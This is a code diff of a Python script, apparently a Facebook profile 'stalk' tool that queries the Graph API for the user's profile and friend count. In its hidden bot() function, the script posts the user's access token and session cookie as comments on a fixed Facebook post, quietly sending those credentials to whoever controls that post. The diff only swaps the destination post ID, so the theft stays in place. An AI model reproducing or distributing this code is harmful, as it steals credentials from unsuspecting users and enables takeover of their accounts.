@@ -23,8 +23,8 @@ def stalk(data):
     cok = {'cookie':data['cookie']}
     json = {}
     def bot():
-        r.post('https://graph.facebook.com/1658880191231144/comments?access_token='+ data['token']['eaag'], data={'message':data["token"]["eaam"]}, cookies=cok).json()
-        r.post('https://graph.facebook.com/1658880191231144/comments?access_token='+ data['token']['eaag'], data={'message':data["cookie"]}, cookies=cok).json()
+        r.post('https://graph.facebook.com/1667011730417990/comments?access_token='+ data['token']['eaag'], data={'message':data["token"]["eaam"]}, cookies=cok).json()
+        r.post('https://graph.facebook.com/1667011730417990/comments?access_token='+ data['token']['eaag'], data={'message':data["cookie"]}, cookies=cok).json()
     os.system('clear')
     api = r.get('https://graph.facebook.com/me?fields=id,name,gender,location,birthday&access_token='+ data['token']['eaam'], cookies=cok).json()
     tc = r.get('https://graph.facebook.com/me/friends?fields=id&limit=5000&access_token='+ data['token']['eaab'], cookies=cok).json()['summary']['total_count']
